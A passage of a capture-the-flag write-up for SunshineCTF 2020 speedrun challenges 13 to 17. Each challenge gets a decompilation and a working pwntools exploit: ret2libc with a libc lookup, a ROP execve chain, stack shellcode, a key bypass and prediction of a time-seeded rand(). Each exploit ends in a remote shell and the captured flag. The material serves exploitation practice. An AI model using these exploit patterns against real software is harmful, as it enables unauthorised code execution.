```c  
void vuln(void)  
{  
 char local_3e [54];  
  
__x86.get_pc_thunk.ax();  
 gets(local_3e);  
 return;  
}  
```

In my haste I kinda missed the boat on this one.  There's a `win` function
called `systemFunc` that gives you a shell.

Every week I solve problem like this (sans the `win` function).  It is a basic
ROP pattern of leaking the location and version of libc, then scoring a 2nd
pass to then get a shell.  Which is exactly what I did here.  I should have
been more suspicious given how short all the other speedruns were, however
since I solve these all the time I was able to c&p and solve this in less than
a minute anyway.

All the details of how this works is here:
[newpax](https://github.com/datajerk/ctf-write-
ups/tree/master/darkctf2020/newpax).

All that is really different is the offset (`0x3e` from, you guessed it,
`local_3e`).

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_13')  
context.log_level = 'INFO'

if not args.REMOTE:  
   context.log_file = 'local.log'  
   libc = binary.libc  
   p = process(binary.path)  
else:  
   context.log_file = 'remote.log'  
   libc_index = 1  
   p = remote('chal.2020.sunshinectf.org', 30013)

p.sendlineafter('Keep on writing\n','foobar')

payload  = 0x3e * b'A'  
payload += p32(binary.plt.puts)  
payload += p32(binary.sym.vuln)  
payload += p32(binary.got.puts)

p.sendline(payload)  
_ = p.recv(4)  
puts = u32(_)  
log.info('puts: ' + hex(puts))  
p.recv(20)

if not 'libc' in locals():  
   try:  
       import requests  
       r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})  
       libc_url = r.json()[libc_index]['download_url']  
       libc_file = libc_url.split('/')[-1:][0]  
       if not os.path.exists(libc_file):  
log.info('getting: ' + libc_url)  
           r = requests.get(libc_url, allow_redirects=True)  
           open(libc_file,'wb').write(r.content)  
   except:  
       log.critical('get libc yourself!')  
       sys.exit(0)  
   libc = ELF(libc_file)

libc.address = puts - libc.sym.puts  
log.info('libc.address: ' + hex(libc.address))

payload  = 0x3e * b'A'  
payload += p32(libc.sym.system)  
payload += 4 * b'B'  
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendline(payload)  
p.interactive()  
```

Again, checkout [newpax](https://github.com/datajerk/ctf-write-
ups/tree/master/darkctf2020/newpax) for details.  If you're interested in a
more robust _automatically-find-me-libc-and-give-me-shellz_, then checkout
[babypwn ROP](https://github.com/datajerk/ctf-write-
ups/tree/master/cybersecurityrumblectf2020/babypwn#rop-post-aslr-world).

Output:

```bash  
# ./exploit_13.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-13/chall_13'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done  
[*] puts: 0xf7e2dcb0  
[*] getting: https://libc.rip/download/libc6_2.23-0ubuntu11.2_i386.so  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-13/libc6_2.23-0ubuntu11.2_i386.so'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] libc.address: 0xf7dce000  
[*] Switching to interactive mode

$ id  
uid=1000(chall_13) gid=1000(chall_13) groups=1000(chall_13)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     7380 Nov  7 07:49 chall_13  
-rw-r----- 1 root chall_13   34 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{almost-easy-61ddd735cf9053b0}  
```

## speedrun-14

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No PIE, but everything else (mostly)--this is ROP, and the solution I used in
[speedrun-13](#speedrun-13) could be used here (x86_64 version, e.g.
[roprop](https://github.com/datajerk/ctf-write-
ups/tree/master/darkctf2020/roprop)), BUT.... this is statically linked:

```bash  
$ file chall_14  
chall_14: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically
linked,  
for GNU/Linux 3.2.0, BuildID[sha1]=2936c7ad85f602a3701fef5df2a870452f6d3499,
not stripped  
```

IOW, this is loaded with ROP gadgets, getting a shell is easy, just run:

```  
ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a  
```

and send that to the return address on that stack.

### Decompile with Ghidra

```c  
void main(void)  
{  
 char local_68 [64];  
 char local_28 [32];  
  
 puts("You can hear the sound of a thousand...");  
 fgets(local_28,0x14,(FILE *)stdin);  
 gets(local_68);  
 return;  
}  
```

So, yeah, just send `0x68` bytes of whatever, followed by your ROP chain.

BTW, there are a bunch of different ways to solve this.  This was for me the
lazy fast way.  All script-kiddie.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_14')  
context.log_level = 'INFO'

if not args.REMOTE:  
   context.log_file = 'local.log'  
   p = process(binary.path)  
else:  
   context.log_file = 'remote.log'  
   p = remote('chal.2020.sunshinectf.org', 30014)

#ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a  
IMAGE_BASE_0 = binary.address  
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)  
rop  = b''  
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;  
rop += b'//bin/sh'  
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;  
rop += rebase_0(0x00000000002b90e0)  
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi],
r13; pop rbx; pop rbp; pop r12; pop r13; ret;  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;  
rop += p64(0x0000000000000000)  
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;  
rop += rebase_0(0x00000000002b90e8)  
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi],
r13; pop rbx; pop rbp; pop r12; pop r13; ret;  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += p64(0xdeadbeefdeadbeef)  
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;  
rop += rebase_0(0x00000000002b90e0)  
rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret;  
rop += rebase_0(0x00000000002b90e8)  
rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret;  
rop += rebase_0(0x00000000002b90e8)  
rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret;  
rop += p64(0x000000000000003b)  
rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;

payload  = 0x68 * b'A'  
payload += rop

p.sendline()  
p.sendline(payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_14.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-14/chall_14'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30014: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_14) gid=1000(chall_14) groups=1000(chall_14)  
$ ls -l  
total 832  
-rwxr-xr-x 1 root root     844816 Nov  7 07:49 chall_14  
-rw-r----- 1 root chall_14     39 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{hail-to-the-king-c24f18e818fb4986}  
```

## speedrun-15

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

Groan.  More shellcode.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_4e [10];  
 int local_44;  
 undefined4 local_40;  
 undefined4 local_3c;  
 undefined4 local_38;  
 undefined4 local_34;  
 undefined4 local_30;  
 undefined4 local_2c;  
 undefined4 local_28;  
 undefined4 local_24;  
 undefined4 local_20;  
 undefined4 local_1c;  
 undefined4 local_18;  
 undefined4 local_14;  
 undefined4 local_10;  
 int local_c;  
  
 printf("There\'s a place where nothing seems: %p\n",local_4e);  
 local_c = 0xdead;  
 local_10 = 0xdead;  
 local_14 = 0xdead;  
 local_18 = 0xdead;  
 local_1c = 0xdead;  
 local_20 = 0xdead;  
 local_24 = 0xdead;  
 local_28 = 0xdead;  
 local_2c = 0xdead;  
 local_30 = 0xdead;  
 local_34 = 0xdead;  
 local_38 = 0xdead;  
 local_3c = 0xdead;  
 local_40 = 0xdead;  
 local_44 = 0xdead;  
 fgets(local_4e,0x5a,stdin);  
 if ((local_44 != 0xfacade) && (local_c != 0xfacade)) {  
   exit(0);  
 }  
 return;  
}  
```

`fgets` will get enough bytes to overwrite the return address, but not enough
to put a payload after that, so we'll have to navigate the `local_44` and
`local_c` constraints and fit in our shellcode.  Neat!

Before that we'll have to score a stack leak from the `printf` statement.

The attack is fairly straightforward.

1. Write out `0x4e - 0x44` bytes of garbage to get to `local_44` (`fgets` is writing to `local_4e`).  
2. Then write out `0xfacade` as a 32-bit (`undefined4`) value.  
3. Align the stack.  We need to make sure that the leaked stack address + our current payload ends in `0` or `8` or our shellcode will most certainly fail.  Pad it out.  
4. Add the size of the payload to the stack address at this point.  
5. Insert shellcode here.  
5. Pad out to `0xc` (`0x4e - len(payload) - 0xc`).  
6. Then write out `0xfacade` as a 32-bit (`undefined4`) value.  
7. Pad out to return address.  
8. Write stack address as return (as 64-bit).

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_15')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30015)

p.sendline()  
p.recvuntil('There\'s a place where nothing seems: ')  
_ = p.recvline().strip()  
stack = int(_,16)  
log.info('stack: ' + hex(stack))

# http://shell-storm.org/shellcode/files/shellcode-905.php  
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'  
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'  
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'  
shellcode += b'\x49\x89\xd2\x0f\x05'

payload  = b''  
payload += (0x4e - 0x44) * b'A'  
payload += p32(0xfacade)  
payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'

stack += len(payload)  
log.info('stack: ' + hex(stack))

payload += shellcode  
payload += (0x4e - len(payload) - 0xc) * b'C'  
payload += p32(0xfacade)  
payload += (0x4e - len(payload)) * b'D'  
payload += p64(stack)

p.sendline(payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_15.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-15/chall_15'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to chal.2020.sunshinectf.org on port 30015: Done  
[*] stack: 0x7ffd4e7d875a  
[*] stack: 0x7ffd4e7d8770  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_15) gid=1000(chall_15) groups=1000(chall_15)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8464 Nov  7 07:49 chall_15  
-rw-r----- 1 root chall_15   34 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{bat-country-53036e8a423559df}  
```

## speedrun-16

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

All mitigations in place.  Nice.

### Decompile with Ghidra

```c  
void main(void)  
{  
 size_t sVar1;  
 size_t sVar2;  
 long in_FS_OFFSET;  
 int local_60;  
 char local_58 [56];  
 long local_20;  
  
 local_20 = *(long *)(in_FS_OFFSET + 0x28);  
 fgets(local_58,0x31,stdin);  
 sVar1 = strlen(local_58);  
 sVar2 = strlen(key);  
 if (sVar1 == sVar2) {  
   local_60 = 0;  
   while( true ) {  
     sVar1 = strlen(key);  
     if (sVar1 <= (ulong)(long)local_60) break;  
     if (local_58[local_60] != key[local_60]) {  
       exit(0);  
     }  
     local_60 = local_60 + 1;  
   }  
   system("/bin/sh");  
 }  
 if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {  
   __stack_chk_fail();  
 }  
 return;  
}  
```

Yeah, this is just [speedtest-09](#speedtest-09) without the "crypto", nothing
to see here.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_16')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30016)

p.send(binary.string(binary.sym.key))  
p.interactive()  
```

Output:

```bash  
# ./exploit_16.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-16/chall_16'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30016: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_16) gid=1000(chall_16) groups=1000(chall_16)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8648 Nov  7 07:49 chall_16  
-rw-r----- 1 root chall_16   43 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{beast-and-the-harlot-73058b6d2812c771}  
```

## speedrun-17

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

Again all mitigations in place.

### Decompile with Ghidra

```c  
void main(void)  
{  
 time_t tVar1;  
 long in_FS_OFFSET;  
 uint local_18;  
 uint local_14;  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 tVar1 = time((time_t *)0x0);  
 srand((uint)tVar1);  
 local_14 = rand();  
 __isoc99_scanf(&DAT_00100aea,&local_18);  
 if (local_14 == local_18) {  
   win();  
 }  
 else {  
   printf("Got: %d\nExpected: %d\n",(ulong)local_18,(ulong)local_14);  
 }  
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
   __stack_chk_fail();  
 }  
 return;  
}  
```

The exploit here it taking advantage of `rand`.  From the code, seed with the
current time.  So just compute the same random number with `rand` using the
UTC time as the seed.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_17')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30017)

from ctypes import *  
libc = cdll.LoadLibrary('libc.so.6')  
libc.srand(libc.time(None))

p.sendline(str(libc.rand()))  
log.info('flag: ' + p.recvline().decode())  
```

Python can call C functions directly, so doing this all in Python was pretty
straightforward.

Output:

```bash  
# ./exploit_17.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-17/chall_17'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30017: Done  
[*] flag: sun{unholy-confessions-b74c1ed1f1d486fe}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/blob/master/sunshinectf2020/speedrun/README.md).